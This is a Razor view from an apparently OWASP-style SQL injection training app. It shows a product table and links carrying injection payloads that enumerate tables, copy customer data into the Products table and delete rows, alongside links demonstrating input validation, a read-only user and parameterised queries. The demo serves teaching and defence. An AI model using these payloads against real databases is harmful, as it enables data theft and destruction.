@ModelType IEnumerable(Of owasp01.injection.data.Product)
@Code
ViewData("Title") = "Index"
End Code

<h2>Products</h2>
<h3>@ViewData("Url")</h3>
<p>
    @Html.ActionLink("Filter on Category 1", "Index", New With {.CategoryId = "1"})
</p>
<table class="table">
    <tr>
        <th>Product ID</th>
        <th>Product Name</th>
        <th>Supplier ID</th>
        <th>Category ID</th>
        <th>Quantity Per Unit</th>
        <th>UnitPrice</th>
        <th>Units In Stock</th>
        <th>Units On Order</th>
        <th>Reorder Level</th>
        <th>Discontinued</th>
    </tr>

@For Each item In Model
    @<tr>
         <td>@item.ProductID</td>
         <td>@item.ProductName</td>
         <td>@item.SupplierID</td>
         <td>@item.CategoryID</td>
         <td>@item.QuantityPerUnit</td>
         <td>@item.UnitPrice</td>
         <td>@item.UnitsInStock</td>
         <td>@item.UnitsOnOrder</td>
         <td>@item.ReorderLevel</td>
         <td>@item.Discontinued</td>
        <td>
            @*@Html.ActionLink("Edit", "Edit", New With {.id = item.PrimaryKey}) |
            @Html.ActionLink("Details", "Details", New With {.id = item.PrimaryKey}) |
            @Html.ActionLink("Delete", "Delete", New With {.id = item.PrimaryKey})*@
        </td>
    </tr>
Next

</table>
<p>
    <h3>Vulnerabilities Discovery</h3>
    <ol>
        <li>@Html.ActionLink("Validate 'productname' column name", "Index", New With {.CategoryId = "1 OR productname = ''"})</li>
        <li>@Html.ActionLink("Validate 'Products' table name", "Index", New With {.CategoryId = "1 OR 1=(SELECT COUNT(*) FROM Products)"})</li>
        <li>@Html.ActionLink("Validate 'Customers' table name", "Index", New With {.CategoryId = "1 OR 1=(SELECT COUNT(*) FROM Customers)"})</li>
        <li>@Html.ActionLink("Check UPDATE permission", "Index", New With {.CategoryId = "1;UPDATE Products SET productname = productname"})</li>
    </ol>
    <h3>Extract Data</h3>
    <ol>
        <li>@Html.ActionLink("Transfer Table Names", "Index", New With {.CategoryId = "1;INSERT INTO Products(productname) select name from sys.tables"})</li>
        <li>@Html.ActionLink("Transfer Customer Data", "Index", New With {.CategoryId = "1;INSERT INTO Products(productname) SELECT companyname FROM Customers"})</li>
        <li>@Html.ActionLink("Retrieve Transferred Data", "Index", New With {.CategoryId = "500 OR CategoryId IS NULL"})</li>
    </ol>
    <h3>Delete Data</h3>
    <ol>
        <li>@Html.ActionLink("Clean Customer Data", "Index", New With {.CategoryId = "1;DELETE Products WHERE CategoryId IS NULL"})</li>
    </ol>
    <h3>Guidelines</h3>
    <ol>
        <li>@Html.ActionLink("Input Validation - Cannot append SQL Statements", "InputValidation", New With {.CategoryId = "1 OR productname = ''"})</li>
        <li>@Html.ActionLink("Read-Only User - Cannot Transfer Data", "ReadOnlyUser", New With {.CategoryId = "1;INSERT INTO Products(productname) SELECT companyname FROM Customers"})</li>
        <li>@Html.ActionLink("SQL Parameters - Cannot execute data", "SQLParameters", New With {.CategoryId = "1 OR productname = ''"})</li>
        <li>@Html.ActionLink("All Guidelines Combined", "Safe", New With {.CategoryId = "1 OR productname = ''"})</li>
    </ol>
</p>
